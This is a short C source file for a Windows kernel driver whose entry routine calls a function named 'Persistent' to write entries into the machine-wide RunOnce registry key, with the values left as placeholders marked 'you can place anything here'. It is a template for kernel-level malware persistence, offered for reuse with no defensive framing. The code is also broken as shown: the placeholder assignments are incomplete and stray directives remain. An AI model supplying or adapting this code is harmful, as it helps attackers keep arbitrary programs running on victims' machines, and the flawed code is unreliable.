#pragma once
#include "driver.h"
#include "driver.tmh"

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#endif


#include <ntddk.h>
#include <wdf.h>
#include <Wdm.h>

#pragma comment(lib, "NtosKrnl.lib")
#pragma comment(lib, "Ntdll.lib")

VOID 
Persistent(
	 _In_ LPWSTR ld,
	 _In_ LPWSTR lv,
	 _In_ LPWSTR ln
)
{
	UNICODE_STRING Ro;
	UNICODE_STRING Re;
	OBJECT_ATTRIBUTES obj;
	HANDLE hKey;

	RtlInitUnicodeString(&Ro, ld);

	obj.Length = sizeof(OBJECT_ATTRIBUTES);
	obj.RootDirectory = NULL;
	obj.ObjectName = &Ro;
	obj.SecurityDescriptor = NULL;
	obj.SecurityQualityOfService = NULL;
	obj.Attributes = OBJ_CASE_INSENSITIVE;

	char buff[256] = { 0 };
	ZwCreateKey(
		&hKey,
		GENERIC_ALL,
		&obj,
		0,
		NULL,
		0,
		NULL
	);

	LPWSTR lDat = lv;
	RtlInitUnicodeString(&Re, ln);
	ZwSetValueKey(hKey, &Re, 0, REG_SZ, lDat, wcslen(lDat) * sizeof(wchar_t));
	ZwClose(hKey);
}

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    )
{
	LPWSTR ld0 = L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
	LPWSTR lv0 = // you can place anything here.
	LPWSTR ln0 = // you can place anything here.
	LPWSTR lv1 = // you can place anything here.
	LPWSTR ln1 = // you can place anything here.
	Persistent(
		ld0,
		lv0,
		ln0
	);
	Persistent(
		ld0,
		lv1,
		ln1
	);
	return STATUS_SUCCESS;
}
